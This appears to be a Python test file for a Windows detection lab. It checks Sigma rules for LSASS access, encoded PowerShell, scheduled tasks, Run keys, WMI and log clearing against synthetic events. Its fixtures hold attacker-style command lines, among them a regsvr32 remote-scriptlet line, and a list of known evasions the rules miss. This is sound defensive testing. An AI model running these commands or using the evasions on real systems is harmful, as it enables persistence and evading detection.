#!/usr/bin/env python3
"""Offline rule-logic tests that pin known gaps and known noise.

Each synthetic event is evaluated two independent ways: by a small Sigma
evaluator in this file and by the project's exact-count DSL. Both must equal
the expected verdict. Four kinds of case are pinned:

  detect  the rule must match
  ignore  the rule must not match
  gap     a documented evasion or uncovered variant: the rule does NOT match
  noise   benign activity the rule DOES match

Gaps and noise are expectations, not failures. They record what the rules do
not cover so that a future change which alters them is deliberate. Fixtures
are synthetic, stay offline, and are never measured results.

Usage: python3 tests/test_known_gaps.py [--list]
"""
import argparse
import datetime
import importlib.util
import re
import sys
import uuid
from pathlib import Path

import yaml
from sigma.collection import SigmaCollection
from sigma.conditions import (ConditionAND, ConditionFieldEqualsValueExpression,
                              ConditionNOT, ConditionOR)
from sigma.types import SigmaNumber, SigmaString, SpecialChars

ROOT = Path(__file__).resolve().parents[1]
SYSMON = "Microsoft-Windows-Sysmon/Operational"
SYSMON_CATEGORIES = {"process_creation", "process_access", "registry_set", "wmi_event"}
failures = []
notes = []


def check(condition, message):
    if not condition:
        failures.append(message)
    return condition


# --------------------------------------------------------------------------
# (a) Independent Sigma evaluator: generic Sigma fields, case-insensitive.
# --------------------------------------------------------------------------
def sigma_string_regex(value):
    out = ""
    for part in value.s:
        if isinstance(part, str):
            out += re.escape(part)
        elif part is SpecialChars.WILDCARD_MULTI:
            out += ".*"
        elif part is SpecialChars.WILDCARD_SINGLE:
            out += "."
        else:
            raise AssertionError("unsupported Sigma string part")
    return re.compile(out, re.I | re.S)


def sigma_eval(node, event):
    if isinstance(node, ConditionAND):
        return all(sigma_eval(arg, event) for arg in node.args)
    if isinstance(node, ConditionOR):
        return any(sigma_eval(arg, event) for arg in node.args)
    if isinstance(node, ConditionNOT):
        return not sigma_eval(node.args[0], event)
    if isinstance(node, ConditionFieldEqualsValueExpression):
        actual = event.get(node.field)
        if actual is None:
            return False
        if isinstance(node.value, SigmaNumber):
            return str(actual) == str(node.value.number)
        if isinstance(node.value, SigmaString):
            return sigma_string_regex(node.value).fullmatch(str(actual)) is not None
    raise AssertionError("unsupported Sigma node: " + type(node).__name__)


def sigma_verdict(rule, event):
    # The lab pipeline scopes these four categories to the Sysmon channel.
    if rule.logsource.category in SYSMON_CATEGORIES and event.get("Channel") != SYSMON:
        return False
    return sigma_eval(rule.detection.parsed_condition[0].parsed, event)


# --------------------------------------------------------------------------
# (b) Matcher for the project's exact-count DSL (Elasticsearch semantics).
# --------------------------------------------------------------------------
def es_wildcard(pattern, text):
    out, i = "", 0
    while i < len(pattern):
        char = pattern[i]
        if char == "\\" and i + 1 < len(pattern):
            i += 1
            out += re.escape(pattern[i])
        elif char == "*":
            out += ".*"
        elif char == "?":
            out += "."
        else:
            out += re.escape(char)
        i += 1
    return re.fullmatch(out, text, re.I | re.S) is not None


def lookup(doc, dotted):
    for part in dotted.split("."):
        if not isinstance(doc, dict):
            return None
        doc = doc.get(part)
    return doc


def dsl_eval(query, doc):
    if "bool" in query:
        b = query["bool"]
        return (all(dsl_eval(q, doc) for q in b.get("filter", []))
                and not any(dsl_eval(q, doc) for q in b.get("must_not", []))
                and sum(dsl_eval(q, doc) for q in b.get("should", [])) >= b.get("minimum_should_match", 0))
    if "wildcard" in query:
        (field, spec), = query["wildcard"].items()
        value = lookup(doc, field)
        values = value if isinstance(value, list) else [value]
        return any(v is not None and es_wildcard(spec["value"], str(v)) for v in values)
    if "term" in query:
        (field, wanted), = query["term"].items()
        value = lookup(doc, field)
        return wanted in value if isinstance(value, list) else value == wanted
    if "exists" in query:
        return lookup(doc, query["exists"]["field"]) is not None
    raise AssertionError("unsupported DSL node")


def to_ecs(event):
    """Represent a generic Sigma event the way this lab's Winlogbeat indexes it."""
    doc = {"event": {}, "winlog": {"event_data": {}}, "process": {}, "registry": {"data": {}}}
    for key, value in event.items():
        if key == "EventID":
            doc["event"]["code"] = str(value)
        elif key == "Channel":
            doc["winlog"]["channel"] = value
        elif key == "Image":
            doc["process"]["executable"] = value
        elif key == "CommandLine":
            doc["process"]["command_line"] = value
        elif key == "TargetObject":
            doc["registry"]["path"] = value
        elif key == "Details":
            doc["registry"]["data"]["strings"] = [value]
        else:
            doc["winlog"]["event_data"][key] = value
    return doc


# --------------------------------------------------------------------------
# Synthetic cases: (rule stem, kind, expected, description, event)
# kind: "detect" expected match, "ignore" expected non-match,
#       "gap" documented miss (expected non-match), "noise" benign but matches.
# --------------------------------------------------------------------------
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
SCH = r"C:\Windows\System32\schtasks.exe"
LSASS = r"C:\Windows\System32\lsass.exe"
RUN = r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater"
RUNONCE = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Setup"


def ev(code, channel=SYSMON, **fields):
    return dict(EventID=code, Channel=channel, **fields)


CASES = [
    # --- LSASS -------------------------------------------------------------
    ("lsass_selected_read_access", "detect", True, "mimikatz-style mask 0x1010",
     ev(10, TargetImage=LSASS, GrantedAccess="0x1010")),
    ("lsass_selected_read_access", "detect", True, "upper-case image and mask",
     ev(10, TargetImage=LSASS.upper(), GrantedAccess="0X1FFFFF")),
    ("lsass_selected_read_access", "detect", True, "tuned mask 0x101ffb",
     ev(10, TargetImage=LSASS, GrantedAccess="0x101ffb")),
    ("lsass_selected_read_access", "ignore", False, "query-only mask 0x1000",
     ev(10, TargetImage=LSASS, GrantedAccess="0x1000")),
    ("lsass_selected_read_access", "ignore", False, "other target process",
     ev(10, TargetImage=r"C:\Windows\System32\svchost.exe", GrantedAccess="0x1010")),
    ("lsass_selected_read_access", "ignore", False, "name only contains lsass.exe",
     ev(10, TargetImage=r"C:\Temp\notlsass.exe", GrantedAccess="0x1010")),
    ("lsass_selected_read_access", "ignore", False, "same event in the Security channel",
     ev(10, "Security", TargetImage=LSASS, GrantedAccess="0x1010")),
    ("lsass_selected_read_access", "gap", False, "read-only mask 0x10 is not in the list",
     ev(10, TargetImage=LSASS, GrantedAccess="0x10")),
    ("lsass_selected_read_access", "gap", False, "read mask 0x1418 is not in the list",
     ev(10, TargetImage=LSASS, GrantedAccess="0x1418")),
    ("lsass_selected_read_access", "gap", False, "handle duplication 0x40 has no read bit",
     ev(10, TargetImage=LSASS, GrantedAccess="0x40")),
    ("lsass_selected_read_access", "noise", True, "msiexec with full access (seen 50x in Win11 baseline)",
     ev(10, TargetImage=LSASS, GrantedAccess="0x1fffff", SourceImage=r"C:\Windows\System32\msiexec.exe")),
    # --- Encoded PowerShell ------------------------------------------------
    ("powershell_encoded_command", "detect", True, "-enc",
     ev(1, Image=PS, CommandLine="powershell.exe -NoP -W Hidden -enc SQBFAFgA")),
    ("powershell_encoded_command", "detect", True, "-EncodedCommand, quoted path",
     ev(1, Image=PS, CommandLine='"' + PS + '" -EncodedCommand SQBFAFgA')),
    ("powershell_encoded_command", "detect", True, "-e",
     ev(1, Image=PS, CommandLine="powershell -e SQBFAFgA")),
    ("powershell_encoded_command", "detect", True, "pwsh -ec",
     ev(1, Image=r"C:\Program Files\PowerShell\7\pwsh.exe", CommandLine="pwsh.exe -ec SQBFAFgA")),
    ("powershell_encoded_command", "ignore", False, "-ExecutionPolicy is not an encoded flag",
     ev(1, Image=PS, CommandLine="powershell.exe -NoProfile -ExecutionPolicy Bypass -File build.ps1")),
    ("powershell_encoded_command", "ignore", False, "-ep / -ex abbreviations",
     ev(1, Image=PS, CommandLine="powershell.exe -ep bypass -ex bypass -File build.ps1")),
    ("powershell_encoded_command", "ignore", False, "encoded flag on a non-PowerShell image",
     ev(1, Image=r"C:\Windows\System32\cmd.exe", CommandLine="cmd.exe /c echo -enc SQBFAFgA")),
    ("powershell_encoded_command", "ignore", False, "PowerShell start in the Security channel",
     ev(1, "Security", Image=PS, CommandLine="powershell.exe -enc SQBFAFgA")),
    ("powershell_encoded_command", "gap", False, "-encod (valid PowerShell abbreviation)",
     ev(1, Image=PS, CommandLine="powershell.exe -encod SQBFAFgA")),
    ("powershell_encoded_command", "gap", False, "-encodedcomm (valid PowerShell abbreviation)",
     ev(1, Image=PS, CommandLine="powershell.exe -encodedcomm SQBFAFgA")),
    ("powershell_encoded_command", "gap", False, "/enc (slash prefix is accepted by PowerShell)",
     ev(1, Image=PS, CommandLine="powershell.exe /enc SQBFAFgA")),
    ("powershell_encoded_command", "gap", False, "tab instead of space after the flag",
     ev(1, Image=PS, CommandLine="powershell.exe -enc\tSQBFAFgA")),
    ("powershell_encoded_command", "gap", False, "renamed PowerShell binary",
     ev(1, Image=r"C:\Users\Public\notepad.exe", CommandLine="notepad.exe -enc SQBFAFgA")),
    ("powershell_encoded_command", "noise", True, "' -e ' belonging to another tool's arguments",
     ev(1, Image=PS, CommandLine='powershell.exe -Command "git commit -e -m fix"')),
    # --- Schtasks ----------------------------------------------------------
    ("schtasks_create_task", "detect", True, "/create with /tr",
     ev(1, Image=SCH, CommandLine="schtasks /create /tn Updater /tr C:\\Temp\\a.exe /sc onlogon")),
    ("schtasks_create_task", "detect", True, "/CREATE with /XML, quoted path",
     ev(1, Image=SCH, CommandLine='"' + SCH + '" /CREATE /TN Updater /XML C:\\Temp\\t.xml')),
    ("schtasks_create_task", "ignore", False, "/run", ev(1, Image=SCH, CommandLine="schtasks /run /tn Updater")),
    ("schtasks_create_task", "ignore", False, "/delete", ev(1, Image=SCH, CommandLine="schtasks /delete /tn Updater /f")),
    ("schtasks_create_task", "ignore", False, "/query", ev(1, Image=SCH, CommandLine="schtasks /query /fo list")),
    ("schtasks_create_task", "ignore", False, "/create text on another image",
     ev(1, Image=r"C:\Windows\System32\cmd.exe", CommandLine="cmd /c echo schtasks /create /tn x /tr y")),
    ("schtasks_create_task", "gap", False, "/change /tr rewrites an existing task's action",
     ev(1, Image=SCH, CommandLine="schtasks /change /tn Updater /tr C:\\Temp\\evil.exe")),
    ("schtasks_create_task", "gap", False, "tab-separated arguments",
     ev(1, Image=SCH, CommandLine="schtasks\t/create\t/tn\tUpdater\t/tr\tC:\\Temp\\a.exe")),
    ("schtasks_create_task", "gap", False, "Register-ScheduledTask never starts schtasks.exe",
     ev(1, Image=PS, CommandLine="powershell.exe -c Register-ScheduledTask -TaskName Updater -Action $a")),
    ("schtasks_create_task", "gap", False, "renamed copy of schtasks.exe",
     ev(1, Image=r"C:\Temp\st.exe", CommandLine="st.exe /create /tn Updater /tr C:\\Temp\\a.exe")),
    ("schtasks_create_task", "noise", True, "Office updater registering a task from XML (seen in Win11 baseline)",
     ev(1, Image=SCH, CommandLine="schtasks.exe /create /tn Office\\Update /xml C:\\Temp\\office.xml")),
    # --- Run key -----------------------------------------------------------
    ("run_key_suspicious_value", "detect", True, "Run value launching PowerShell",
     ev(13, TargetObject=RUN, Details="powershell.exe -w hidden -File C:\\ProgramData\\u.ps1")),
    ("run_key_suspicious_value", "detect", True, "RunOnce value under Temp",
     ev(13, TargetObject=RUNONCE, Details=r"C:\Users\a\AppData\Local\Temp\setup.exe")),
    ("run_key_suspicious_value", "detect", True, "upper-case %TEMP%",
     ev(13, TargetObject=RUN.upper(), Details=r"%TEMP%\A.EXE")),
    ("run_key_suspicious_value", "ignore", False, "Program Files payload",
     ev(13, TargetObject=RUN, Details=r"C:\Program Files\Vendor\app.exe")),
    ("run_key_suspicious_value", "ignore", False, "non-string registry data",
     ev(13, TargetObject=RUN, Details="DWORD (0x00000001)")),
    ("run_key_suspicious_value", "ignore", False, "suspicious data but not a Run key",
     ev(13, TargetObject=r"HKLM\SOFTWARE\Vendor\Settings\Path", Details="powershell.exe")),
    ("run_key_suspicious_value", "gap", False, "32-bit Run key under WOW6432Node",
     ev(13, TargetObject=r"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\Updater",
        Details="powershell.exe -w hidden")),
    ("run_key_suspicious_value", "gap", False, "Policies\\Explorer\\Run autostart location",
     ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\Updater",
        Details="powershell.exe -w hidden")),
    ("run_key_suspicious_value", "gap", False, "payload in C:\\Users\\Public",
     ev(13, TargetObject=RUN, Details=r"C:\Users\Public\evil.exe")),
    ("run_key_suspicious_value", "gap", False, "payload in C:\\ProgramData",
     ev(13, TargetObject=RUN, Details=r"C:\ProgramData\evil.exe")),
    ("run_key_suspicious_value", "gap", False, "regsvr32 is not in the utility list",
     ev(13, TargetObject=RUN, Details="regsvr32 /s /u /i:http://x/a.sct scrobj.dll")),
    ("run_key_suspicious_value", "noise", True, "ordinary per-user app autostart in AppData (OneDrive-style)",
     ev(13, TargetObject=RUN.replace("Updater", "OneDrive"),
        Details=r'"C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background')),
    # --- WMI ---------------------------------------------------------------
    ("wmi_consumer_filter_binding", "detect", True, "Sysmon 21 binding", ev(21)),
    ("wmi_consumer_filter_binding", "ignore", False, "Sysmon 19 filter only", ev(19)),
    ("wmi_consumer_filter_binding", "ignore", False, "Sysmon 20 consumer only", ev(20)),
    ("wmi_consumer_filter_binding", "ignore", False, "event 21 in another channel", ev(21, "System")),
    # --- Log clearing ------------------------------------------------------
    ("windows_event_log_cleared", "detect", True, "Security 1102", ev(1102, "Security")),
    ("windows_event_log_cleared", "detect", True, "System 104", ev(104, "System")),
    ("windows_event_log_cleared", "ignore", False, "1102 outside Security", ev(1102, "System")),
    ("windows_event_log_cleared", "ignore", False, "104 outside System", ev(104, "Application")),
    ("windows_event_log_cleared", "ignore", False, "Sysmon event with unrelated code", ev(1)),
    ("windows_event_log_cleared", "noise", True, "System 104 from any provider (provider is not checked)",
     ev(104, "System", Provider_Name="Some-Other-Provider")),
]


def rule_logic(root):
    sys.path.insert(0, str(root / "scripts"))
    spec = importlib.util.spec_from_file_location("validation", root / "scripts/validate-rules.py")
    validation = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(validation)
    dsl = {item[0].stem: item[4] for item in validation.load_suite()}
    rules = {}
    for path in sorted((root / "rules").glob("*.yml")):
        rules[path.stem] = SigmaCollection.from_yaml(path.read_text()).rules[0]
    counts = {"detect": 0, "ignore": 0, "gap": 0, "noise": 0}
    per_rule = {}
    for stem, kind, expected, label, event in CASES:
        a = sigma_verdict(rules[stem], event)
        b = dsl_eval(dsl[stem], to_ecs(event))
        ok = check(a == expected, f"[{stem}] independent evaluator: {label}: got {a}, expected {expected}")
        ok &= check(b == expected, f"[{stem}] project DSL: {label}: got {b}, expected {expected}")
        check(a == b, f"[{stem}] evaluator and project DSL disagree: {label}")
        counts[kind] += 1
        per_rule.setdefault(stem, set()).add(kind)
        if kind in ("gap", "noise") and ok:
            notes.append((kind, stem, label))
    for stem in rules:
        check({"detect", "ignore"} <= per_rule.get(stem, set()), f"[{stem}] lacks a positive or negative case")
    return rules


def metadata(root, rules):
    ids = set()
    for stem, rule in rules.items():
        raw = yaml.safe_load((root / "rules" / (stem + ".yml")).read_text())
        try:
            parsed = uuid.UUID(raw["id"])
            check(parsed.version == 4, f"[{stem}] id is not a version-4 UUID")
        except (ValueError, KeyError):
            check(False, f"[{stem}] id is not a valid UUID")
        check(raw["id"] not in ids, f"[{stem}] duplicate rule id")
        ids.add(raw["id"])
        check(raw.get("status") == "experimental", f"[{stem}] status is not experimental")
        check(raw.get("level") in {"informational", "low", "medium", "high", "critical"}, f"[{stem}] invalid level")
        check(isinstance(raw.get("date"), (datetime.date, str)), f"[{stem}] missing date")
        check(bool(raw.get("falsepositives")), f"[{stem}] missing falsepositives")
        check(raw.get("logsource", {}).get("product") == "windows", f"[{stem}] logsource product is not windows")
        techniques = [t for t in raw["tags"] if re.fullmatch(r"attack\.t\d{4}(\.\d{3})?", t)]
        check(len(techniques) == 1, f"[{stem}] expected exactly one ATT&CK technique tag")
        for tag in techniques:
            tid = tag.split(".", 1)[1].upper()
            url = "https://attack.mitre.org/techniques/" + tid.replace(".", "/") + "/"
            check(url in raw.get("references", []), f"[{stem}] references lack {url}")
    masks = yaml.safe_load((root / "rules/lsass_selected_read_access.yml").read_text())["detection"]["selection"]["GrantedAccess"]
    for mask in masks:
        check(int(mask, 16) & 0x10, f"LSASS mask {mask} lacks PROCESS_VM_READ (0x10)")
    check(len(masks) == len(set(m.lower() for m in masks)), "duplicate LSASS masks")


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--list", action="store_true", help="print every pinned gap and noise case")
    args = parser.parse_args()
    rules = rule_logic(ROOT)
    metadata(ROOT, rules)
    if failures:
        print(f"FAILED: {len(failures)} check(s)", file=sys.stderr)
        for failure in failures:
            print("  -", failure, file=sys.stderr)
        sys.exit(1)
    if args.list:
        for kind, title in (("gap", "KNOWN GAPS (the rule does not match)"),
                            ("noise", "KNOWN NOISE (benign, but the rule matches)")):
            print(title)
            for _, stem, label in [n for n in notes if n[0] == kind]:
                print(f"  {stem}: {label}")
    gaps = sum(1 for n in notes if n[0] == "gap")
    noise = sum(1 for n in notes if n[0] == "noise")
    print(f"Passed: {len(CASES)} synthetic events evaluated two independent ways; "
          f"{gaps} known gaps and {noise} known noise cases pinned; rule IDs, tags, references, "
          "and LSASS read-mask bits verified. Fixtures stayed offline.")


if __name__ == "__main__":
    main()
